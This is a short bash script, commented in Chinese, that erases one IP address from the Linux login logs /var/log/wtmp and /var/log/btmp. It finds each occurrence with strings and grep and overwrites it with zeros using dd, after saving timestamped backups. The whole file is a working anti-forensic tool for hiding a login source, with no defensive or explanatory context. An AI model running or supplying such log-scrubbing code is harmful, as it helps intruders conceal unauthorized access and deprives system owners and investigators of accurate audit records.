#!/bin/bash


IP="192.168.20.5"
LOG_FILES=("/var/log/wtmp" "/var/log/btmp")

for FILE in "${LOG_FILES[@]}"; do
    if [ ! -f "$FILE" ]; then
        echo "$FILE 不存在，跳过..."
        continue
    fi

    # 备份
    cp "$FILE" "$FILE.bak.$(date +%Y%m%d%H%M%S)"
  

    # 查找 IP 在二进制文件里的偏移位置
    # 输出格式: 偏移:内容
    offsets=$(strings -t d "$FILE" | grep "$IP" | awk '{print $1}')

    for off in $offsets; do
        # 覆盖 16 字节（IP 地址在日志里通常占用不到 16 字节）
        dd if=/dev/zero of="$FILE" bs=1 seek="$off" count=16 conv=notrunc &>/dev/null
     
    done
done
